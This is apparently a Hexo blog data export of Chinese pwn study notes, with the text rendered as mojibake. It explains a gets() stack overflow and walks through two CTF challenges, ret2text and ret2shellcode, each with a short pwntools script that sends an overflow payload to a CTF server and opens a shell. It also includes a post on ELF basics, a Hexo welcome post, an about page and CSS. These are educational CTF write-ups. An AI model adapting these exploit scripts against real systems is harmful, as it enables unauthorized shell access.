class="type">int</span> <span class="title function_">overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç¨‹åºè¿è¡Œåˆ° gets çš„æ—¶å€™ï¼Œå› ä¸º gets æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹çš„é•¿åº¦è¿›è¡Œé™åˆ¶ï¼Œå°±å¯¼è‡´äº†æœ¬æ¥æœ€å¤šè¾“å…¥ 8 å­—èŠ‚çš„å†…å®¹ï¼Œç»“æœè¾“å…¥äº†è¶…è¿‡ 8 å­—èŠ‚çš„å†…å®¹å¯¼è‡´äº†æº¢å‡ºï¼Œè¦†ç›–æ‰äº† bp å¯„å­˜å™¨ä»¥åŠè¿”å›åœ°å€çš„å€¼ï¼Œå¦‚ä¸‹ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/46531ac3516e437caee9cd80941f185d.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸Šçš„åŸç†ï¼Œå°†è¿”å›åœ°å€çš„å€¼ä¿®æ”¹ä¸ºç¨‹åºè‡ªå¸¦çš„åé—¨å‡½æ•°ï¼ˆå¦‚ system (&quot;/bin/sh&quot;)ï¼‰ä¸­å³å¯ã€‚</p><h3 id="2é¢˜ç›®ç¤ºä¾‹nssctf-2022-spring-recruitr3m4ke"><a class="markdownIt-Anchor" href="#2é¢˜ç›®ç¤ºä¾‹nssctf-2022-spring-recruitr3m4ke">#</a> ï¼ˆ2ï¼‰é¢˜ç›®ç¤ºä¾‹â€“[NSSCTF 2022 Spring Recruit] R3m4ke?ï¼š</h3><p>â€‹æ‹¿åˆ° ELF æ–‡ä»¶ä¹‹åç¬¬ä¸€æ­¥åº”è¯¥å…ˆæ£€æŸ¥ç›¸å…³çš„ä¿æŠ¤ï¼Œå› ä¸ºä¿æŠ¤è¿™é‡Œè¿˜æ²¡æœ‰è®²ï¼Œæ‰€ä»¥è¿™é‡Œæ‹¿åˆ°çš„æ˜¯ä¸€ä¸ªåªå¼€äº† NX ä¿æŠ¤çš„é¢˜ç›®ï¼Œè¯¥ä¿æŠ¤å¯¹è¿™é“é¢˜å‡ ä¹æ²¡æœ‰ä»€ä¹ˆå½±å“ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/7def99ff9bb140a2a03df9b1a04444cf.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ª 64 ä½çš„å°ç«¯åºæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ IDA è¿›è¡Œåç¼–è¯‘ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/9ac23fd3d87546dcb03b398658d926b9.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œå¯ä»¥å¾ˆç›´è§‚çš„å‘ç°ï¼Œè¯¥å‡½æ•°å£°æ˜äº†ä¸€ä¸ª 32 å­—èŠ‚çš„å˜é‡ï¼Œä¹‹åé€šè¿‡ gets () å‡½æ•°æ¥å†™å…¥å†…å®¹ï¼Œä½†æ˜¯å´æ²¡æœ‰å¯¹é•¿åº¦è¿›è¡Œç›¸å…³çš„é™åˆ¶ï¼Œå› æ­¤å­˜åœ¨æº¢å‡ºæ¼æ´ï¼Œè¿™ä¸ªæ—¶å€™å°±åªéœ€è¦æ‰¾åˆ°åé—¨å‡½æ•°çš„åœ°å€å³å¯ï¼Œä¹‹åé€šè¿‡ Sheft+F12ï¼Œæ‰¾åˆ° /bin/sh è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åè·Ÿè¿›ï¼Œå‘ç°å®ƒå­˜åœ¨äºä¸€ä¸ªå«åš LookAtMe () è¿™ä¸ªå‡½æ•°ä¸­ï¼Œè¿™é‡Œï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä»å‡½æ•°è§†å›¾ä¸­æ‰¾åˆ°åé—¨ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/2a634e35ccb943d381dd3777ceb0fc56.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œå¯ä»¥æ‰¾åˆ°åé—¨å‡½æ•°çš„åœ°å€ï¼ŒåŠ 0x40072Cï¼Œå› æ­¤ï¼Œè¿™é‡Œå°±å¯ä»¥ç¼–å†™ expï¼Œå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28043</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x40072C</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>â€‹è¿è¡Œä»£ç ä¹‹åæˆåŠŸæ‹¿åˆ°äº†ç›®æ ‡ä¸»æœºçš„ shellï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/2c80dc47052b4c0b99da4499f6cf23e2.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="5æ ˆæº¢å‡ºä¹‹ret2shellcode"><a class="markdownIt-Anchor" href="#5æ ˆæº¢å‡ºä¹‹ret2shellcode">#</a> 5. æ ˆæº¢å‡ºä¹‹â€“ret2shellcodeï¼š</h2><h3 id="1åŸç†-2"><a class="markdownIt-Anchor" href="#1åŸç†-2">#</a> ï¼ˆ1ï¼‰åŸç†ï¼š</h3><p>â€‹è¯¥æ–¹æ³•åŸç†ä¸ ret2shellcode ç±»ä¼¼ï¼Œåªæ˜¯ï¼ŒåŸæœ¬å­˜åœ¨çš„åé—¨æ²¡æœ‰äº†ï¼Œä½†æ˜¯ç»™äº†è¶³å¤Ÿçš„å¯å†™å…¥çš„åœ°æ–¹äºç”¨æˆ·å†™å…¥ shellcode ä»£ç ï¼Œè¿™é‡Œå‰æœŸå­˜åœ¨ä¸¤ç§æ–¹æ³•å†™å…¥ shellcodeï¼Œç¬¬ä¸€ç§æ˜¯å†™å…¥ Stack ä¸­ï¼Œç¬¬äºŒç§æ˜¯å†™å…¥ bss æ®µï¼Œå‡†ç¡®åœ°è¯´ï¼Œå¿…é¡»å½“ä¸€ä¸ªæ®µä¸­å­˜åœ¨å¯å†™å¯æ‰§è¡Œçš„æƒé™æ—¶æ‰èƒ½è¿›è¡Œ ret2shellcodeã€‚</p><p>â€‹æ­¥éª¤å¤§è‡´æ˜¯ï¼Œé¦–å…ˆä¿®æ”¹ä¸‹ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œæ¯”å¦‚ context.archï¼Œå½“ç¨‹åºæ—¶ 64 ä½æ—¶ï¼Œåº”è¯¥è®²æ­¤ä¿®æ”¹ä¸º amd64ï¼›ä¹‹åï¼Œè®© python ç¨‹åºè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª shellcode æˆ–è€…å»ç›¸åº”çš„åœ°æ–¹æ‰¾ï¼Œpython çš„ç›¸å…³ä»£ç æ˜¯ï¼šshellcraft [.amd64].sh ()ï¼›ä¹‹åé€šè¿‡ asm () å‡½æ•°å°†ç”Ÿæˆçš„ shllcode ç¼–è¯‘æˆæœºå™¨ç ï¼›ç„¶åå°±æ˜¯å‘é€ç›¸å…³çš„åƒåœ¾æ•°æ®ä¹‹ç±»çš„è¿›è¡Œåç»­æ“ä½œã€‚</p><h3 id="2é¢˜ç›®æ¡ˆä¾‹hnctf-2022-week1ret2shellcode"><a class="markdownIt-Anchor" href="#2é¢˜ç›®æ¡ˆä¾‹hnctf-2022-week1ret2shellcode">#</a> ï¼ˆ2ï¼‰é¢˜ç›®æ¡ˆä¾‹â€“[HNCTF 2022 Week1] ret2shellcode</h3><p>â€‹å…ˆæŸ¥çœ‹å®ƒçš„ä¿æŠ¤ç±»å‹ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/c1a04d4871a6468a9009b2ab3e122848.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‘ç°è·Ÿä¸Šä¸€ä¸ªä¸€è‡´ï¼Œè¿™é‡Œå¯ä»¥ç®€å•è¯´ä¸‹ NX ä¿æŠ¤ï¼ŒNX ä¿æŠ¤æ˜¯æ ˆä¸å¯æ‰§è¡Œï¼Œå¼€å¯äº†è¿™ä¸ªä¿æŠ¤ä¹‹åï¼Œåœ¨æ ˆä¸Šå†™å…¥çš„ shellcode å°†ä¸ä¼šå› ä¸ºæˆ‘ä»¬ä¿®æ”¹çš„ return address çš„å€¼è€Œæ‰§è¡Œï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠç›®æ ‡æ”¾åˆ° bss æ®µä¸Šï¼Œä¸è¿‡ï¼Œé¦–å…ˆè¿˜æ˜¯å¾—ç¡®ä¿ bss æ®µæ˜¯å¦å­˜åœ¨å¯æ‰§è¡Œæƒé™ã€‚</p><p>â€‹å¯¹äºè¿™é“é¢˜ï¼Œé¦–å…ˆåº”è¯¥åç¼–è¯‘ï¼Œå¾—åˆ°ä¼ªä»£ç ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/bae3083c571a4f3ca431d421ec703486.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œåœ¨ main å‡½æ•°ä¸­ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ç”Ÿå‘½ buff å˜é‡ï¼Œ ä½†æ˜¯è¿™é‡Œå´å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œè¯´æ˜ buff æ˜¯åœ¨å…¨å±€å˜é‡ä¸­è¿›è¡Œçš„å£°æ˜ï¼Œå› æ­¤è¿™é‡Œè·Ÿè¿›è¿™ä¸ªå˜é‡ï¼Œå‘ç°å…¶åœ¨ bss æ®µä¸­ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/b596d670671f4ecf843459c14d1a037c.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¦å¤–ï¼Œé€šè¿‡ pwndbg çš„ vmmap å‘½ä»¤å¯ä»¥çŸ¥é“è¿™æ®µå†…å­˜å­˜åœ¨å¯æ‰§è¡Œçš„æƒé™ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/2b6bc44c1d3448dcbf4a298ef01afe7a.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å› æ­¤ï¼Œè¿™ä¸ªé¢˜ç›®çš„æ€è·¯å°±å¾ˆæ˜äº†äº†ï¼Œé¦–å…ˆæ˜¯ç¨‹åºçš„åˆ†æï¼Œé€šè¿‡å†™å…¥å­—ç¬¦ä¸²ç»™ sï¼Œç„¶åå°† s çš„å†…å®¹å¤åˆ¶ç»™ buffï¼Œé™åˆ¶çš„ s çš„å†™å…¥é•¿åº¦é•¿äº 256 å­—èŠ‚ï¼Œå› æ­¤å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œè¿™é‡Œå°±å¾ˆæ˜äº†äº†ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28172</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">buff = <span class="number">0x4040A0</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;A&#x27;</span>) + p64(buff)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æœ€åæˆåŠŸæ‹¿åˆ°ç›®æ ‡ shellï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/52851acf64c0452f9dcff98caec859a4.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnå­¦ä¹ ç¬”è®°ï¼ˆ1ï¼‰--å‰ç½®çŸ¥è¯†</title>
      <link href="/posts/c06afb6e.html"/>
      <url>/posts/c06afb6e.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°1"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°1">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ1ï¼‰</h1><h2 id="1pwnç®€ä»‹"><a class="markdownIt-Anchor" href="#1pwnç®€ä»‹">#</a> ï¼ˆ1ï¼‰pwn ç®€ä»‹ï¼š</h2><pre><code>ä»¥ä¸‹æ¥è‡ªäºç™¾åº¦ç™¾ç§‘ï¼šâ€Pwnâ€æ˜¯ä¸€ä¸ªé»‘å®¢è¯­æ³•çš„ä¿šè¯­è¯ï¼Œæ˜¯æŒ‡æ”»ç ´è®¾å¤‡æˆ–è€…ç³»ç»Ÿå‘éŸ³ç±»ä¼¼â€œç °â€ï¼Œå¯¹é»‘å®¢è€Œè¨€ï¼Œè¿™å°±æ˜¯æˆåŠŸå®æ–½é»‘å®¢æ”»å‡»çš„å£°éŸ³â€”â€”ç °çš„ä¸€å£°ï¼Œè¢«â€œé»‘â€çš„ç”µè„‘æˆ–æ‰‹æœºå°±è¢«ä½ æ“çºµäº† ã€‚</code></pre><h2 id="2å‡ ä¸ªç®€å•çš„åè¯"><a class="markdownIt-Anchor" href="#2å‡ ä¸ªç®€å•çš„åè¯">#</a> ï¼ˆ2ï¼‰å‡ ä¸ªç®€å•çš„åè¯ï¼š</h2><pre><code>exploitï¼šç”¨äºæ”»å‡»çš„è„šæœ¬ä¸æ–¹æ¡ˆpayloadï¼šæ”»å‡»è½½è·ï¼Œæ˜¯å¯¹ç›®æ ‡è¿›ç¨‹åŠ«æŒæ§åˆ¶æµçš„æ•°æ®shellcodeï¼šè°ƒç”¨æ”»å‡»ç›®æ ‡çš„shellä»£ç ï¼Œå¸¸è§çš„æœ‰bashå’Œsh</code></pre><h2 id="3cæºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶"><a class="markdownIt-Anchor" href="#3cæºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶">#</a> ï¼ˆ3ï¼‰C æºä»£ç åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼š</h2><pre><code>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</code></pre><p><img data-src="https://s2.loli.net/2024/05/21/IrRs7DdMKH5i2be.png" alt=""></p><pre><code>Cæºä»£ç ç»è¿‡ç¼–è¯‘æˆä¸ºæ±‡ç¼–ä»£ç ï¼Œæ±‡ç¼–ä»£ç å†ç»è¿‡æ±‡ç¼–æˆä¸ºæœºå™¨ç ï¼Œå³ç”Ÿæˆä¸€ä¸ªelfï¼ˆäºŒè¿›åˆ¶ï¼‰ç›®æ ‡æ–‡ä»¶ï¼Œè¿›è¡Œé“¾æ¥åæˆä¸ºelfå¯æ‰§è¡Œæ–‡ä»¶ï¼š</code></pre><p><img data-src="https://s2.loli.net/2024/05/21/NLbaZoejBP1lyHd.png" alt=""></p><h2 id="4å¯æ‰§è¡Œæ–‡ä»¶"><a class="markdownIt-Anchor" href="#4å¯æ‰§è¡Œæ–‡ä»¶">#</a> ï¼ˆ4) å¯æ‰§è¡Œæ–‡ä»¶ï¼š</h2><p>1.Windowsï¼šPE</p><pre><code>å¯æ‰§è¡Œç¨‹åº  .exeåŠ¨æ€é“¾æ¥åº“  .dllé™æ€é“¾æ¥åº“  .lib</code></pre><p>2.Linuxï¼šELF</p><pre><code>å¯æ‰§è¡Œç¨‹åº  .outåŠ¨æ€é“¾æ¥åº“  .soé™æ€é“¾æ¥åº“  .a</code></pre><h2 id="5elfæ–‡ä»¶ä¿¡æ¯"><a class="markdownIt-Anchor" href="#5elfæ–‡ä»¶ä¿¡æ¯">#</a> ï¼ˆ5ï¼‰ELF æ–‡ä»¶ä¿¡æ¯ï¼š</h2><pre><code>ï¼ˆ1ï¼‰æ®µè§†å›¾ï¼šåœ¨å†…å­˜ä¸­ç¨‹åºåŠ è½½åˆ°å†…å­˜æˆä¸ºä¸€ä¸ªè¿›ç¨‹åï¼Œè¿›è¡Œè¯»å†™ã€æ‰§è¡Œæƒé™åˆ’åˆ†çš„è§†å›¾ï¼›èŠ‚è§†å›¾ï¼šæ˜¯ä¸€ä¸ªelfæ–‡ä»¶ï¼Œå­˜æ”¾åœ¨ç£ç›˜ä¸­ï¼Œè¿›è¡Œä¸åŒåŠŸèƒ½åŒºåŸŸåˆ’åˆ†çš„è§†å›¾ï¼ˆ2ï¼‰codeèŠ‚åŒ…å«çš„å†…å®¹æ˜¯æœºå™¨ç ã€‚ä¸åŒçš„åˆ†åŒºæœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œæ ¹æ®ä¸åŒçš„åŠŸèƒ½è¢«åˆ’åˆ†æˆä¸åŒçš„ä»£ç èŠ‚ã€‚ï¼ˆ3ï¼‰ä¸åŒçš„èŠ‚å¯èƒ½å±äºä¸€ä¸ªæ®µã€‚å¤šä¸ªèŠ‚å¯ä»¥åˆå¹¶æˆä¸€ä¸ªæ®µï¼Œæ®µåœ¨elfæ–‡ä»¶åŠ è½½åˆ°è¿›ç¨‹åèµ·ä½œç”¨ã€‚</code></pre><p><img data-src="https://s2.loli.net/2024/05/21/hQG4JDngTEmpskR.png" alt=""></p><h2 id="6ç¨‹åºè£…åœ¨ä¸è™šæ‹Ÿå†…å­˜"><a class="markdownIt-Anchor" href="#6ç¨‹åºè£…åœ¨ä¸è™šæ‹Ÿå†…å­˜">#</a> ï¼ˆ6ï¼‰ç¨‹åºè£…åœ¨ä¸è™šæ‹Ÿå†…å­˜ï¼š</h2><pre><code>ç¡¬ç›˜ä¸­çš„ELFæ–‡ä»¶åœ¨å¯åŠ¨çš„æ—¶å€™ï¼Œä¼šè¢«è£…è½½åˆ°å†…å­˜ä¸­å½¢æˆä¸€ä¸ªè™šæ‹Ÿæ˜ åƒï¼ŒåŒæ—¶ï¼ŒELFä¸­ç›¸åº”çš„èŠ‚ä¼šç»„åˆåœ¨ä¸€èµ·æˆä¸ºä¸€ä¸ªä¸ªä¸ªæ®µï¼š</code></pre><p><img data-src="https://s2.loli.net/2024/05/21/HtdbrK4Psmk2JuE.png" alt=""></p><pre><code>å¯¹äº32ä½çš„ELFæ–‡ä»¶ï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨è£…è½½çš„æ—¶å€™åˆ†å‡º4Gçš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼ŒåŒæ—¶ï¼Œæœ€é«˜ä½åœ°å€é‚£1Gå±äºå†…æ ¸ç©ºé—´ï¼Œç”¨æ¥å­˜æ”¾ä¸€äº›å†…æ ¸çš„ä»£ç ï¼Œè€Œå‰©ä¸‹çš„3Gå±äºç”¨æˆ·ç©ºé—´ï¼Œç”¨æˆ·ç©ºé—´æ˜¯å„è‡ªç‹¬ç«‹çš„ï¼Œä½†å†…æ ¸ç©ºé—´æ˜¯å…±äº«çš„ï¼Œåœ¨ç‰©ç†å†…å­˜ä¸­åªéœ€è¦å­˜åœ¨ä¸€ä»½å³å¯</code></pre><p><img data-src="https://s2.loli.net/2024/05/21/ovrHZ6SwsRGqn1a.png" alt=""></p><pre><code>å¯¹äºä¸€ä¸ªè™šæ‹Ÿå†…å­˜è€Œè¨€å­˜åœ¨å¾ˆå¤šä¸ªæ®µï¼š1.Bssæ®µï¼šç”¨äºå­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å ç”¨å†…å­˜ç©ºé—´ï¼Œä¸å ç”¨ç£ç›˜ç©ºé—´2.Textæ®µï¼šå­˜æ”¾åªè¯»ä¸å†™çš„æ•°æ®å’Œå‡½æ•°3.Stackæ®µï¼šç”¨äºå­˜æ”¾å±€éƒ¨å˜é‡ä»¥åŠå‡½æ•°çš„æ ˆå¸§</code></pre><h2 id="7å¤§ç«¯åºä¸å°ç«¯åº"><a class="markdownIt-Anchor" href="#7å¤§ç«¯åºä¸å°ç«¯åº">#</a> ï¼ˆ7ï¼‰å¤§ç«¯åºä¸å°ç«¯åºï¼š</h2><p><img data-src="https://s2.loli.net/2024/05/21/ncKRAiSZkhGf36B.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvLw==">Hexo</span>! This is your very first post. Check <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=">troubleshooting</span> or you can ask me on <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==">GitHub</span>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start">#</a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post">#</a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s">Writing</span></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server">#</a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=">Server</span></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files">#</a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s">Generating</span></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites">#</a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s">Deployment</span></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>å…³äº</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h1 id="è‡ªè¿°"><a class="markdownIt-Anchor" href="#è‡ªè¿°">#</a> è‡ªè¿°ï¼š</h1><p>â€‹ä¸€ä¸ªå–œæ¬¢è®¡ç®—æœºå°¤å…¶æ˜¯ç½‘ç»œå®‰å…¨çš„ä¿¡æ¯å®‰å…¨ä¸“ä¸šå¤§å­¦ç‰²ï¼Œä¸ä»…å–œæ¬¢çœ‹æŸä½å“¥å“¥å”±è·³ rup ç¯®çƒå’Œ musicï¼Œè¿˜å–œæ¬¢æ¸¸æˆã€åŠ¨æ¼«ã€ç”µå½±ç­‰ç­‰ã€‚</p><h1 id="çˆ±å¥½"><a class="markdownIt-Anchor" href="#çˆ±å¥½">#</a> çˆ±å¥½ï¼š</h1><h2 id="ä¸€ä¸ªéŸ³æ¸¸å®…"><a class="markdownIt-Anchor" href="#ä¸€ä¸ªéŸ³æ¸¸å®…">#</a> ä¸€ä¸ªéŸ³æ¸¸å®…ï¼š</h2><ul><li>arcaeaï¼ˆpttï¼š12.05ï¼‰ï¼Œç›®å‰æ­£åœ¨ä¸ºæ‘˜åŒæ˜Ÿåšå‡†å¤‡ã€‚</li><li>phigrosï¼ˆrksï¼š14.85ï¼‰ï¼Œæ²¡æ€ä¹ˆæ¨</li><li>èŒƒå¼èµ·æºï¼Œæ‰“å¾—å°‘ï¼Œä½†è¿˜åœ¨æ‰“</li><li>æ—‹è½¬éŸ³å¾‹ï¼ˆä¹Ÿå«æ–¹å‘ç›˜ï¼Œä¸çŸ¥é“è‹±æ–‡æ‹¼å†™å¯¹ä¸ï¼‰ï¼Œä¹Ÿæ˜¯å¤„äºå…»è€çŠ¶æ€</li><li>pjskï¼Œæœ‰åœ¨ç½‘ä¸Šçœ‹åˆ°æœ‰æ„æ€çš„æ­Œæ‰æ¨ä¸€æ¨</li><li>Lanotaï¼ˆæ“ç›˜å­ï¼‰ï¼Œæ²¡å›½æœï¼Œç¾æœæ²¡æ³•è´­ä¹°è¿™ä¸ªæ¸¸æˆï¼Œæ‰€ä»¥å¤„äºåŠç©å„¿åŠåºŸçš„çŠ¶æ€</li><li>Orzmicï¼Œå¾ˆå°‘æ‰“ï¼Œä½†æ˜¯æœ€è¿‘ä¸€å£æ°”æ¨äº†å››ç« </li></ul><h2 id="ä¸€ä¸ªå•æœºå®…"><a class="markdownIt-Anchor" href="#ä¸€ä¸ªå•æœºå®…">#</a> ä¸€ä¸ªå•æœºå®…ï¼š</h2><p>â€‹ä½œä¸ºä¸€ä¸ªå•æœºå®…ï¼Œå‡ ä¹ä¸ç©å„¿ç½‘æ¸¸ï¼Œå•æœºæ¶‰è¶³æ¯”è¾ƒå¹¿ï¼Œä½†å¤§å¤šéƒ½æ²¡ç©å„¿é€šå…³ï¼Œå¾ˆå¤šäº‘ç©å„¿é€šï¼Œå› ä¸ºæ²¡é’±ä¹°ã€‚</p><h1 id="ç»¼è¿°"><a class="markdownIt-Anchor" href="#ç»¼è¿°">#</a> ç»¼è¿°ï¼š</h1><p>â€‹ä¸€ä¸ªæ¥è§¦äº† Web å’Œ Pwn ä¸¤ä¸ªæ–¹å‘çš„å‘å¾®çš„ CTF å°èœé¸¡ã€‚</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>å‹é“¾</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {    font-family: ZhuZiAYuanJWD;    src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);    font-display: swap;    font-weight: lighter;  }    div#menus {    font-family: "ZhuZiAYuanJWD";  }  h1#site-title {    font-family: ZhuZiAYuanJWD;    font-size: 3em !important;  }  a.article-title,  a.blog-slider__title,  a.categoryBar-list-link,  h1.post-title {    font-family: ZhuZiAYuanJWD;  }    .iconfont {    font-family: "iconfont" !important;    font-size: 3em;    /* å¯ä»¥å®šä¹‰å›¾æ ‡å¤§å° */    font-style: normal;    -webkit-font-smoothing: antialiased;    -moz-osx-font-smoothing: grayscale;  }    /* æ—¶é—´è½´ç”Ÿè‚–icon */  svg.icon {    /* è¿™é‡Œå®šä¹‰svg.iconï¼Œé¿å…å’ŒButterflyè‡ªå¸¦çš„noteæ ‡ç­¾å†²çª */    width: 1em;    height: 1em;    /* widthå’Œheightå®šä¹‰å›¾æ ‡çš„é»˜è®¤å®½åº¦å’Œé«˜åº¦*/    vertical-align: -0.15em;    fill: currentColor;    overflow: hidden;  }    .icon-zhongbiao::before {    color: #f7c768;  }    /* bilibliç•ªå‰§æ’ä»¶ */  #article-container .bangumi-tab.bangumi-active {    background: 